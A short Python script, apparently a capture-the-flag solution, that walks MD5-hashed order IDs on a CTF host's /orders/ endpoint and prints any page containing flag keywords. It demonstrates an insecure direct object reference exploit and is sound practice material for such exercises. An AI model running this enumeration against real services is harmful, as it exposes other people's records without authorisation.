import requests, hashlib
url = 'https://3f5323bc-0c7b-441d-b035-a1dbd9bbe6fb.ctf.ctfinf.ru/orders/'
for x in range(1, 55):
    x = hashlib.md5(str(x).encode()).hexdigest()
    gt = requests.get(url + str(x)).text
    if 'flag' in gt or 'флаг' in gt or 'vsosh' in gt:
        print(x)